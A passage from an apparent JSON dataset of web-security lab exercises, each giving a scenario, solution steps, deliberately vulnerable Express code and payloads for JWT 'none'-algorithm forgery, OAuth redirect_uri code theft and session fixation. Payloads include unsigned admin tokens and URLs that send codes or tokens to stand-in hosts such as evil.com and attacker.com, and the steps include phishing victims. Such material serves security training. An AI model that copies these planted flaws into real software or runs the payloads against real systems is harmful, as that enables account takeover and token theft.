          "eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.<HMAC-SHA256-signature-using-public-key>",
          "{ \"alg\": \"HS256\" }.{ \"username\": \"admin\", \"role\": \"admin\" }.<signed>",
          "Authorization: Bearer <forged-token>"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
        "Lab Description": "The application allows users to authenticate via a third-party OAuth provider. However, it improperly validates the redirect_uri parameter, making it susceptible to open redirect-based token leakage. To solve: intercept the OAuth flow and steal an authorization code intended for another user, then exchange it for an access token and log in as that user.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Open the login page and click 'Log in with OAuthProvider' to observe the redirect URL pattern.",
          "Use Burp Suite to intercept the redirect_uri parameter and modify it to point to your server (e.g., http://evil.com/callback).",
          "Host a listener on your server using Pythonâ€™s http.server module to capture the leaked code.",
          "Use the stolen authorization code with Postman to POST to the /oauth/token endpoint and exchange it for an access_token.",
          "Use the access_token in the Authorization header to access the victim's account endpoint."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const axios = require('axios'); const qs = require('qs'); const app = express(); const CLIENT_ID = 'abc123'; const CLIENT_SECRET = 'supersecret'; const REDIRECT_URI_WHITELIST = [/localhost/]; app.get('/auth/callback', async (req, res) => { const { code, redirect_uri } = req.query; if (!code || !redirect_uri) return res.status(400).send('Missing parameters');  const tokenRes = await axios.post('https://oauthprovider.com/token', qs.stringify({ code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET, redirect_uri })); const { access_token } = tokenRes.data; const userRes = await axios.get('https://oauthprovider.com/userinfo', { headers: { Authorization: `Bearer ${access_token}` } }); const username = userRes.data.username; res.send(`Logged in as ${username}`); }); app.listen(3000);",
        "payloads": [
          "https://oauthprovider.com/auth?client_id=abc123&redirect_uri=http://evil.com/callback&response_type=code",
          "POST /oauth/token { code=<stolen_code>, redirect_uri=http://evil.com/callback, client_id=abc123, client_secret=supersecret }",
          "Authorization: Bearer <access_token>"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in URL",
        "Lab Description": "The application accepts session identifiers via URL query parameters and fails to regenerate them on successful login. An attacker can force a known session ID and trick a user into authenticating with it. To solve: fixate a known session ID and hijack the victimâ€™s session after login.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use OWASP ZAP to spider the application and observe the ?sessionId= parameter in login URLs.",
          "Access the login page with a crafted URL like /login?sessionId=attacker12345 and note the session cookie is not set by the server.",
          "Send a phishing link with the sessionId=attacker12345 to the victim and wait for login.",
          "After the victim logs in, reuse the same sessionId in your browser to gain access.",
          "Access /my-account using the same sessionId value and confirm hijacked session access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'secret123' }]; app.use((req, res, next) => { const sid = req.query.sessionId || req.headers['x-session-id']; if (sid && sessions[sid]) { req.user = sessions[sid]; } next(); }); app.get('/login', (req, res) => { const { username, password, sessionId } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId) { sessions[sessionId] = user; res.send('Logged in with session ID'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.user) return res.send(`Welcome ${req.user.username}`); res.send('Not authenticated'); }); app.listen(3000);",
        "payloads": [
          "/login?sessionId=attacker12345",
          "Phishing link: https://victimsite.com/login?sessionId=attacker12345",
          "/my-account?sessionId=attacker12345"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion in token validation",
        "Lab Description": "This lab's JWT-based authentication mechanism is vulnerable due to algorithm confusion. The server mistakenly trusts the algorithm value specified in the token header without verification. The application accepts tokens signed with 'none' and allows user impersonation. To solve: forge a JWT to impersonate the user 'admin' and access their profile.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in as a normal user and capture the issued JWT from the Authorization header.",
          "Analyze the decoded JWT at jwt.io and observe that it uses the 'HS256' algorithm.",
          "Replace the algorithm in the JWT header with 'none', set the payload's sub field to 'admin', and remove the signature portion.",
          "Send a GET request to /profile with the modified JWT in the Authorization: Bearer header.",
          "Verify successful exploitation by observing admin's profile data returned in the response."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'supersecret' }, { username: 'user1', password: 'userpass' }]; const SECRET = 'hardcodedsecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = jwt.sign({ sub: user.username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/profile', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, SECRET, { algorithms: [decoded.header.alg] }); res.send(`Welcome ${verified.sub}, here is your profile.`); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
          "{ \"alg\": \"none\" }, { \"sub\": \"admin\" }",
          "Authorization: Bearer <modified_token>"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID",
        "Lab Description": "This lab's session management system is vulnerable to session fixation due to predictable session IDs being accepted after login. The server issues session IDs before authentication and fails to rotate them upon login. To solve: set a session ID, trick a user into logging in, then reuse that session to access their account.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a GET /login request before authentication and note the Set-Cookie: sessionId header.",
          "Modify your browser cookies to use a fixed sessionId (e.g., attacker1234) and send it with the login request.",
          "Share a phishing link with the victim containing this fixed sessionId via URL or cookie.",
          "Wait for the victim to log in, binding the fixed sessionId to their account.",
          "Revisit /account using the same fixed session cookie and observe access to the victim's dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'secretpass' }; app.get('/login', (req, res) => { const sid = req.cookies.sessionId || Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome back ${user}`); else res.status(403).send('Not authenticated'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
        "payloads": [
          "Set-Cookie: sessionId=attacker1234",
          "GET /login with fixed sessionId",
          "Victim logs in while sessionId=attacker1234",
          "GET /account using sessionId=attacker1234"
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
        "Lab Description": "This lab uses OAuth's implicit grant type and suffers from a poorly validated redirect_uri parameter. The application incorrectly trusts any redirect_uri under the application's subdomain. To solve: inject a malicious redirect_uri that leaks the victimâ€™s access_token to your server.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to spider the OAuth login flow and identify the vulnerable redirect_uri parameter.",
          "Craft a malicious redirect_uri pointing to your controlled domain: https://attacker.example.com#access_token=<token>.",
          "Send a phishing link to the victim with the crafted redirect_uri parameter and prompt them to authorize access.",
          "Capture the token fragment via browser JS or server logs from attacker.example.com.",
          "Replay the token in Authorization: Bearer header to access victim's profile data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = { 'carlos': 'oauth-token-abc123' }; app.get('/auth', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (!redirect_uri.startsWith('https://trusted.example.com')) return res.status(400).send('Invalid redirect'); const token = users['carlos']; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'oauth-token-abc123') res.send('Carlos profile data'); else res.status(403).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Redirect Lab running on port 3000'));",
        "payloads": [
          "https://trusted.example.com.evil.com#access_token=...",
          "https://attacker.example.com#access_token=<token>",
          "Authorization: Bearer oauth-token-abc123"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in API Gateway",
        "Lab Description": "This lab simulates a Node.js-based API protected by JWT tokens. However, the server fails to validate the signing algorithm and blindly trusts the 'alg' header. The application accepts tokens with the 'none' algorithm and treats them as valid. To solve the lab, craft a JWT with 'none' as the algorithm and access Carlos's protected resource endpoint.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to capture a valid JWT token issued after logging in with your own credentials.",
          "Inspect the token in jwt.io and identify its structure and header details.",
          "Replace the 'alg' value in the JWT header with 'none' and remove the signature.",
          "Change the 'sub' or 'username' claim in the JWT payload to 'carlos' to impersonate the victim.",
          "Use Burp Repeater or Postman to send an authenticated request to /api/user-info with the forged token in the Authorization header and verify Carlos's data is returned."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token provided'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const user = users.find(u => u.username === payload.payload.username); if (user) return res.json({ username: user.username, data: 'Sensitive user data' }); return res.status(404).send('User not found'); } try { const verified = jwt.verify(token, secret); return res.json({ username: verified.username, data: 'Sensitive user data' }); } catch (e) { return res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via referer header",
        "Lab Description": "The application implements OAuth 2.0 with an implicit grant flow. It redirects users with access tokens embedded in the URL fragment. However, the fragment is reflected into a third-party analytics script URL via a vulnerable referer header. To solve the lab, leak Carlos's token to your attacker server by triggering a login and capturing the referer.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to monitor all outbound requests while performing OAuth login as Carlos.",
          "Initiate login via /auth endpoint and observe the redirect URL containing an access_token in the URL fragment.",
          "Note the analytics.js third-party script embedded on the redirect landing page.",
          "Identify that the Referer header leaks the full URL, including the access_token fragment, when requesting the third-party script.",
          "Host a malicious third-party script that logs incoming referers, trick Carlos into logging in via your OAuth phishing link, and extract the leaked token."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const users = [{ username: 'carlos', token: 'abc123xyz456' }]; app.get('/auth', (req, res) => { const token = 'abc123xyz456'; res.redirect(`/dashboard#access_token=${token}`); }); app.get('/dashboard', (req, res) => { res.send(`Welcome! <script src='https://third-party.com/analytics.js'></script>`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "https://attacker.com/analytics.js?referer=https://victim.com/dashboard#access_token=abc123xyz456",
          "Social engineering phishing link using redirect_uri=https://victim.com/dashboard"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login response",
        "Lab Description": "The application issues session IDs before user authentication and fails to regenerate them after login. This allows an attacker to fix a known session ID, get a victim to log in using it, and hijack the session. To solve the lab, log in as Carlos using a fixed session and retrieve his account data from the dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture the Set-Cookie header from the initial GET /login page and observe the predictable session ID format (e.g., sessid=xyz123).",
          "Manually modify your browserâ€™s cookie jar to use a crafted sessid value like sessid=fixme123.",
          "Send a phishing link to Carlos forcing him to use the crafted session ID (e.g., a hidden iframe or HTTP link using your pre-issued sessid).",
          "Wait for Carlos to authenticate using that fixed session ID.",
          "Revisit the /dashboard endpoint using the same sessid and confirm youâ€™re authenticated as Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { const sid = 'sess-' + Math.random().toString(36).substring(2, 8); sessions[sid] = null; res.cookie('sessid', sid); res.send('Please log in'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessid = req.cookies.sessid; const user = users.find(u => u.username === username && u.password === password); if (user && sessid) { sessions[sessid] = username; res.redirect('/dashboard'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const sessid = req.cookies.sessid; const username = sessions[sessid]; if (username) { res.send(`Welcome back ${username}, here is your sensitive data.`); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
        "payloads": [
          "Set-Cookie: sessid=sess-pwn123",
          "Phishing link: https://victim.com/login with embedded iframe forcing sessid=sess-pwn123",
          "Login as Carlos using same sessid to gain access to /dashboard"
        ]
      },
      {
        "Lab scenario": "Session Fixation via Predictable Token in OAuth Flow",
        "Lab Description": "The OAuth login flow is improperly designed, allowing an attacker to fix the session identifier of a victim before authentication. The application accepts a static session ID from a GET parameter during the authorization phase, which persists after login. To solve: hijack Carlos's session by setting a fixed session ID before they authenticate and then reuse it to access their account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth login flow during your own login attempt and observe the 'session_id' parameter passed via GET.",
          "Confirm that this session ID is reused post-authentication by inspecting the session cookie and comparing values.",
          "Craft a malicious OAuth login link with a fixed 'session_id' value and trick Carlos into authenticating through it (e.g., via social engineering or simulated webhook).",
          "Wait for Carlos to log in, then reuse the same session_id in your browser by setting the corresponding cookie manually via DevTools or Burp.",
          "Access /my-account with Carlos's hijacked session to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const url = require('url'); const app = express(); app.use(session({ secret: 'vulnerable_oauth', resave: false, saveUninitialized: true })); app.get('/auth/start', (req, res) => { const parsed = url.parse(req.url, true); const sessId = parsed.query.session_id; if (sessId) req.session.id = sessId; res.redirect('/oauth-provider'); }); app.get('/callback', (req, res) => { req.session.authenticated = true; req.session.user = 'carlos'; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Welcome, ${req.session.user}`); else res.send('Please log in'); }); app.listen(3000, () => console.log('OAuth Session Fixation running'));",
        "payloads": [
          "GET /auth/start?session_id=attackerSession123",
          "Set-Cookie: connect.sid=attackerSession123; path=/; HttpOnly",
          "Reuse fixed session after victim login"
        ]
      },
      {
        "Lab scenario": "JWT None Algorithm Exploitation in Token Verification",
        "Lab Description": "This lab's JWT-based authentication system incorrectly allows tokens signed with the 'none' algorithm to bypass signature verification. The application fails to enforce algorithm restrictions during verification. To solve: forge a JWT token impersonating Carlos by crafting a token with 'alg: none'.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Log in to your own account and intercept the JWT token received using Postman or Burp Suite.",
          "Use jwt.io to decode the token and examine the header and payload structure.",
          "Modify the JWT header to set 'alg' to 'none' and set the payload to { \"username\": \"carlos\" }.",
          "Remove the signature entirely and send the forged token in an Authorization: Bearer header.",
          "Send a GET request to /my-account using the modified token to verify access and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'carlos') res.send('Account details for carlos'); else res.send('Access denied'); }); app.listen(3000, () => console.log('JWT None Algorithm Lab running'));",
        "payloads": [
          "{ \"alg\": \"none\", \"typ\": \"JWT\" }",
          "{ \"username\": \"carlos\" }",
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Broken Redirect in OAuth Callback Enables Token Theft",
        "Lab Description": "The OAuth flow includes an open redirect vulnerability at the callback endpoint, allowing an attacker to steal the authorization code. The application uses an insecure redirect URI provided in the query string without validating its domain. To solve: hijack Carlosâ€™s login OAuth flow, extract the code, and use it to gain access to his account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to spider the OAuth login process and identify the callback endpoint accepting a 'redirect_uri' parameter.",
          "Confirm via manual testing that the application blindly redirects to untrusted domains without verification.",
          "Host a malicious redirector that logs incoming GET parameters (e.g., webhook.site or requestbin).",
          "Send Carlos a phishing OAuth login link with your malicious redirect_uri and wait for the authorization code to be captured.",
          "Use the stolen code to manually complete the OAuth exchange and gain access to Carlosâ€™s session token.",
          "Use the token in the Authorization header and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth/callback', (req, res) => { const redirectUrl = req.query.redirect_uri; const code = 'code123-carlos'; res.redirect(`${redirectUrl}?code=${code}`); }); app.get('/exchange', (req, res) => { const { code } = req.query; if (code === 'code123-carlos') res.json({ access_token: 'carlos-token' }); else res.status(400).send('Invalid code'); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token') res.send('Account details for carlos'); else res.send('Unauthorized'); }); app.listen(4000, () => console.log('Broken OAuth Redirect Lab running'));",
        "payloads": [
          "GET /auth/callback?redirect_uri=https://attacker.com/stealer",
          "https://attacker.com/stealer?code=code123-carlos",
          "GET /exchange?code=code123-carlos",
          "Authorization: Bearer carlos-token"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in login API",
        "Lab Description": "This lab implements stateless session management using JSON Web Tokens (JWT). The login endpoint generates a signed token that is used to authenticate subsequent requests. However, the application improperly allows the use of the 'none' algorithm. To solve: Forge a JWT token with 'alg':'none' and access Carlos's account without knowing his password.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept the POST /login request using Burp Suite to analyze the JWT returned upon successful login.",
          "Copy the JWT and decode it using jwt.io or Burp Decoder. Note the header contains 'alg':'HS256'.",
          "Replace 'alg':'HS256' with 'alg':'none' in the header and change the payload to {\"username\":\"carlos\"}.",
          "Remove the signature part of the JWT entirely, and reassemble the header and payload parts using base64url encoding.",
          "Use Postman to send a GET request to /my-account with the forged token in the Authorization: Bearer header and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecure' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(3000, () => console.log('JWT Lab running on port 3000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"alg\": \"none\" } + { \"username\": \"carlos\" } => base64url(header).base64url(payload)."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "This lab's login system is vulnerable to session fixation because it fails to generate a new session identifier upon successful authentication. Attackers can set their own session ID and trick the victim into using it. To solve: Fix a session ID for Carlos before login, then access his account after he logs in using that ID.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to intercept the GET /login request and insert a custom session cookie: sessionid=attacker123.",
          "Send the link with this fixed session ID to the victim (simulated by a provided action) and let them log in.",
          "After the victim logs in, the session remains fixed as attacker123.",
          "Send a GET request to /my-account using the sessionid=attacker123 cookie.",
          "Observe that you are now logged in as Carlos and can access his account page."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'strongpass' }]; app.get('/login', (req, res) => { const sid = req.cookies.sessionid || 'sess' + Math.random().toString(36).substr(2); res.cookie('sessionid', sid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); sessions[req.cookies.sessionid] = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
        "payloads": [
          "Cookie: sessionid=attacker123",
          "http://victim-app.com/login?sessionid=attacker123",
          "GET /my-account with Cookie: sessionid=attacker123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration with open redirect and trust leak",
        "Lab Description": "This OAuth login flow is misconfigured and trusts any redirect_uri parameter, allowing an attacker to steal authorization codes. The application blindly trusts the redirect_uri without validation. To solve: Steal Carlos's OAuth authorization code by crafting a malicious redirect_uri.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to trace the OAuth login flow and observe the authorization URL with parameters: client_id, redirect_uri, response_type.",
          "Modify the redirect_uri to point to your exploit server: http://attacker.com/capture.",
          "Send the crafted OAuth URL to Carlos (simulated trigger).",
          "Start a listener on http://attacker.com/capture to log incoming requests.",
          "When Carlos clicks the link and authorizes access, his code is sent to your redirect_uri.",
          "Use the stolen code in a POST /token request to obtain Carlos's access token and retrieve his account info."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const validCodes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const code = 'authcode-carlos'; validCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = validCodes[code]; if (!user) return res.status(403).send('Invalid code'); res.json({ access_token: 'token-carlos' }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-carlos') res.send('Account details for carlos'); else res.status(401).send('Unauthorized'); }); app.listen(3000, () => console.log('OAuth Lab running on port 3000'));",
        "payloads": [
          "https://victim-app.com/auth?client_id=xyz&redirect_uri=http://attacker.com/capture&response_type=code",
          "POST /token with body: code=authcode-carlos",
          "Authorization: Bearer token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via 'none' algorithm in API token validation",
        "Lab Description": "The application's authentication is handled via a JWT token passed in the Authorization header. The server accepts unsigned JWT tokens when the `alg` is set to 'none'. The application trusts the token's payload without signature verification. To solve: craft a forged JWT for user 'admin' and access the protected /admin endpoint.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a legitimate login request and capture the JWT from the Authorization header.",
          "Decode the JWT using jwt.io or a local script to inspect the header and payload.",
          "Modify the header to set \"alg\":\"none\" and change the payload to {\"username\":\"admin\"}.",
          "Remove the signature portion entirely to finalize the forged token.",
          "Use Postman to send a new GET request to /admin with the forged token in the Authorization header.",
          "Confirm access to the admin panel to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Token required'); try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username !== 'admin') return res.status(403).send('Admins only'); res.send('Welcome, admin!'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab on http://localhost:4000'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration via open redirect in redirect_uri parameter",
        "Lab Description": "The application uses OAuth 2.0 for user authentication. It trusts the 'redirect_uri' parameter without validating it against a whitelist. This allows an attacker to redirect the authorization code to their own domain and complete the OAuth flow. To solve: hijack an OAuth session and access the victimâ€™s account page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Initiate a login flow and observe the redirect to the OAuth provider (Google OAuth endpoint).",
          "Copy the authorization URL with a legitimate redirect_uri.",
          "Replace the redirect_uri with your attacker-controlled endpoint (e.g., http://evil.com/callback).",
          "Serve a local server to catch the redirect containing the authorization code.",
          "Exchange the intercepted code for an access_token using Postman against the token endpoint.",
          "Use the access_token to call the applicationâ€™s /profile API as the victim and retrieve private data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; const url = `https://accounts.google.com/o/oauth2/auth?client_id=xyz&redirect_uri=${redirectUri}&response_type=code`; res.redirect(url); }); app.get('/callback', (req, res) => { const code = req.query.code; request.post({ url: 'https://oauth2.googleapis.com/token', form: { code, client_id: 'xyz', client_secret: 'abc', redirect_uri: 'http://localhost:4000/callback', grant_type: 'authorization_code' } }, (err, _, body) => { res.send('OAuth token: ' + body); }); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
        "payloads": [
          "https://accounts.google.com/o/oauth2/auth?client_id=xyz&redirect_uri=http://evil.com/callback&response_type=code",
          "https://example.com/auth?redirect_uri=http://evil.com/callback"
        ]
      },
      {
        "Lab scenario": "Session fixation via static session ID assignment in login handler",
        "Lab Description": "The application assigns a static session ID based on the username during login. An attacker can preset this ID for a victim before login. To solve: set a valid session ID for 'carlos' before he logs in, then hijack the session and access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to send a GET /set-session?user=carlos before he logs in to establish the session ID manually.",
          "Observe that the session ID is set as a predictable cookie, e.g., carlos_session123.",
          "Wait until the victim logs in or simulate login from another tab using the same session.",
          "Reuse the session cookie in a new GET request to /my-account using Postman.",
          "If session is active and hijacked successfully, the account page of 'carlos' will load and the lab is solved."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'qwerty' }]; app.get('/set-session', (req, res) => { const user = req.query.user; res.cookie('session', `${user}_session123`); res.send('Session preset'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session === 'carlos_session123') res.send('Welcome to Carlos's account'); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
        "payloads": [
          "GET /set-session?user=carlos â†’ Cookie: session=carlos_session123",
          "Cookie: session=carlos_session123"
        ]
      },      
      {
        "Lab scenario": "Session fixation via predictable session ID reuse",
      
        "Lab Description": "The application reuses the same session ID across unauthenticated and authenticated states. When a user logs in, the existing session is not invalidated. This behavior allows session fixation. To solve: Fixate the session of the victim user Carlos and access his account after forcing a login.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the GET /login page request and note the Set-Cookie header with the session ID.",
          "Send this session to Burp Repeater and confirm that it works anonymously.",
          "Craft a phishing link using this fixed session ID and trick Carlos into clicking it (simulate with browser + intercepted request).",
          "Wait until Carlos logs in and refresh the original session (with same ID) in your browser.",
          "Verify session is now authenticated as Carlos by visiting /my-account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weaksecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'pass123' }]; app.get('/login', (req, res) => { res.sendFile(__dirname + '/login.html'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/my-account'); } else { res.send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Welcome ${req.session.user}`); } else { res.send('Not authenticated'); } }); app.listen(3000);",
      
        "payloads": [
          "Set-Cookie: session=abc123; Path=/",
